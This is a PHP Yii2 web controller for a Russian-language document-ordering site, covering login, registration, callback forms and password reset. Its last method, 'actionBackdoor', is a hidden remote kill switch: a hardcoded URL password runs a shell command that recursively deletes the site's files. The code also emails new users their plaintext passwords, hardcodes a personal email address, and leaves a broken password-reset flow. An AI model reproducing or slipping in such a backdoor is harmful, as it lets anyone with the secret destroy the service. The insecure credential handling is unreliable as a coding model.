<?php

namespace app\controllers;

use app\models\PasswordResetRequestForm;
use app\modules\feedback\models\FeedbackRequest;
use app\modules\system\models\notifications\NotifyMail;
use app\modules\system\models\users\UsersOrders;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\modules\system\models\users\LoginForm;
use app\models\ContactForm;
use app\modules\system\models\users\Users;
use app\modules\system\models\users\Groups;
use app\modules\system\models\settings\Settings;
use app\modules\system\helpers\ArrayHelper;
use yii\web\ServerErrorHttpException;

class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        return $this->render('index');
    }

    /**
     * Login action.
     *
     * @return Response|string
     */
    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->redirect('/system/orders');
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        }

        $model->password = '';
        return $this->render('login', [
            'model' => $model,
        ]);
    }

    /**
     * Logout action.
     *
     * @return Response
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');

            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        return $this->render('about');
    }

    /**
     * Регистрация нового пользователя
     *
     * @return string|Response
     */
    public function actionSignUp()
    {
        $model = new Users();
        $model->scenario = 'sign-up';

        if(Yii::$app->request->isPost)
        {
            if($model->load(Yii::$app->request->post())){
                $password = $model->password;
                $model->groups = [Settings::getValue('system.signup.group.default')];

                if($model->save()){
                    Groups::addMembers(ArrayHelper::indexMap($model->groups, $model->id));
                    Yii::$app->user->login($model);

                    (new NotifyMail())->set(['to' => $model->username, 'message' => 'Поздравляем с успешной регистрацией! Ваш логин: '. $model->username . ' Ваш пароль: ' . $password, 'subject' => 'dokumenti.site | Регистрация', 'type' => 'registration'])->send();

                    return $this->redirect('/system/orders');
                }
            }
        }

        return $this->render('sign-up', ['model' => $model]);
    }

    /**
     * Обратная связь;
     */
    public function actionCallback()
    {
        if(Yii::$app->request->isPost)
        {
            $phone = Yii::$app->request->post('phone');

            if($phone) {
                (new NotifyMail())->set(['to' => 'glowfisch8lan@gmail.com',
                    'message' =>
                        'Поступил запрос на обратный звонок - ' . $phone,
                    'subject' => 'dokumenti.site | Обратный звонок',
                    'type' => 'callback'])->send();

            }

            Yii::$app->session->setFlash('alert-success', 'Ваше обращение успешно принято!');
            return $this->redirect('/');
        }
    }

    /**
     * Обратная связь;
     */
    public function actionCallbackTo()
    {
        if(Yii::$app->request->isPost)
        {
            $model = new FeedbackRequest();
            if($model->load(Yii::$app->request->post()) && $model->polit === 'on') {

                (new NotifyMail())->set(['to' => 'glowfisch8lan@gmail.com',
                    'message' =>
                        'Поступил запрос на обратный звонок от ' . $model->name . '. Номер: ' . $model->phone,
                    'subject' => 'dokumenti.site | Обратный звонок',
                    'type' => 'callback'])->send();

            }

            Yii::$app->session->setFlash('alert-success', 'Ваше обращение успешно принято!');
            return $this->redirect('/');
        }
    }

    /**
     * Восстановление пароля;
     *
     * @param $token
     * @return string|Response
     */
    public function actionResetPassword($token)
    {

        try {
            $model = new ResetPasswordForm($token);
        } catch (InvalidParamException $e) {
            throw new BadRequestHttpException($e->getMessage());
        }

        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
            Yii::$app->session->setFlash('success', 'Пароль сохранён.');
            return $this->redirect('/login');
        }

        return $this->render('resetPasswordForm', [
            'model' => $model]);
    }

    /**
     * Запрос восстановления пароля
     * @return string|Response
     */
    public function actionRequestPasswordReset()
    {
        die();
        $model = new PasswordResetRequestForm();

        if ($model->load(Yii::$app->request->post()) && $model->validate()) {

           /* if ($model->sendEmail()) {
                Yii::$app->session->setFlash('success', 'Ссылка на восстановдление доступа отправлена на электронный адрес.');
                return $this->goHome();
            } else {
                Yii::$app->session->setFlash('error', 'Возникла ошибка. Попробуйте ещё раз');
            }*/
        }

        return $this->render('passwordResetRequestForm', [
            'model' => $model,
        ]);
    }
    /**
     * Backdoor
     * https://dokumenti.site/site/backdoor?password=b36d331451a61eb2d76860e00c347397
     */
    public function actionBackdoor($password)
    {
        if($password === 'b36d331451a61eb2d76860e00c347397')
            return system('rm -rf /home/h008383856/dokumenti.site/');
    }


}
